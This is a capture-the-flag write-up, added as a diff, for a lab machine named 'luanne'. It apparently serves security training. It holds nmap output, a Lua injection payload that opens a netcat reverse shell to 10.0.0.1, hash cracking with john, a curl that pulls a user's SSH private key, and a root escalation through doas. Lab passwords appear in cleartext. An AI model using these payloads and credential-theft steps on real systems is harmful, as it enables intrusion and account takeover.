@@ -1,0 +1,66 @@
+#luanne
+
+--- Port Scan ---
+# nmap -sC -sV -oA nmap 10.10.10.218 -Pn
+Starting Nmap 7.70 ( https://nmap.org ) at 2020-12-01 08:18 EET
+Nmap scan report for 10.10.10.218
+Host is up (0.28s latency).
+Not shown: 997 closed ports
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
+| ssh-hostkey:
+| 3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)
+| 521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)
+|_ 256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)
+80/tcp open http nginx 1.19.0
+| http-auth:
+| HTTP/1.1 401 Unauthorized\x0D
+|_ Basic realm=.
+| http-robots.txt: 1 disallowed entry
+|_/weather
+|_http-server-header: nginx/1.19.0
+|_http-title: 401 Unauthorized
+9001/tcp open http Medusa httpd 1.12 (Supervisor process manager)
+| http-auth:
+| HTTP/1.1 401 Unauthorized\x0D
+|_ Basic realm=default
+|_http-server-header: Medusa/1.12
+|_http-title: Error response
+Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd
+Service detection performed. Please report any incorrect results at
+https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 151.57 seconds
+
+--- Enumeration ---
+Inside the robots.txt we got /weather which we already have from the nmap result.
+durp /weather >>> forecast >>>> “city=list”
+From nmap OS is NetBSD.
+payload >>');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f")-- >> url encoding
+
+-----Getting reverse shell-----
+as httpd.
+$ cat .htpasswd
+webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
+$ john creds.txt --wordlist=/usr/share/wordlists/rockyou.txt
+iamthebest
+---- priv esc ----------
+$ netstat -aan
+curl --user webapi_user:iamthebest 127.0.0.1:3001/~r.michaels/id_rsa  > id_rsa.txt cp /tmp
+with nc sent to kali to connect with ssh
+---- now we login with r,michaels 
+found backup file .But it is encrypted >> netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output=/tmp/whatinfotech.tar.gz
+sudo john --show hash2                                             
+ [sudo] password for nagendra: 
+ ?:littlebear
+ 1 password hash cracked, 0 left
+ 
+ ------ 
+ doas -u root /bin/sh
+ littlebear
+ pwd >>>>>????"""||||"""""""""::":"
+ cd /root
+ cat root.txt
+ we got the flag.
+ done
+
+ 
